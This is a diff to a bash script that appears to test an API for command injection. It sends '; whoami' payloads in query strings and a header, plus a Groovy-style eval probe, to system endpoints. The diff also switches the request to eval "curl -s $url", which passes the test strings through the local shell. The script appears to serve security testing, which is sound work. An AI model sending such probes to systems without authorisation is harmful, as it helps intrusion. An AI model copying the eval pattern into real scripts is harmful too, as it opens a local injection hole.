@@ -25,7 +25,7 @@ test_case() {
     echo -e "\n${YELLOW}[Test $TOTAL]${NC} $name"
     echo "URL: $url"
 
-    response=$(curl -s "$url" 2>/dev/null)
+    response=$(eval "curl -s $url" 2>/dev/null)
     if echo "$response" | grep -qiE "$pattern"; then
         echo -e "  ${GREEN}[✓] Vulnerable${NC}"
         PASSED=$((PASSED + 1))
@@ -38,20 +38,20 @@ test_case() {
 echo -e "${BLUE}=== Command Injection Tests ===${NC}"
 
 test_case "Ping command" \
-    "${BASE_URL}/api/v1/system/ping?host=8.8.8.8; whoami" \
+    "${BASE_URL}/api/v1/system/ping?host=8.8.8.8%3B+whoami" \
     "root|user|uid"
 
 test_case "System exec" \
-    "${BASE_URL}/api/v1/system/exec?file=;whoami" \
+    "${BASE_URL}/api/v1/system/run?dir=%3Bwhoami" \
     "root|user|uid"
 
 test_case "Script eval" \
-    "${BASE_URL}/api/v1/system/script/eval?cmd=\"whoami\".execute()" \
+    "'${BASE_URL}/api/v1/system/script/eval?cmd=%22whoami%22.execute().text'" \
     "root|user|uid"
 
 test_case "Check endpoint" \
-    "${BASE_URL}/api/v1/system/check?input=<script>alert(1)</script>" \
-    "alert|script"
+    "-H \"X-Command:;whoami\" ${BASE_URL}/api/v1/system/check" \
+    "root|user|uid"
 
 # Summary
 echo -e "\n${BLUE}========================================${NC}"
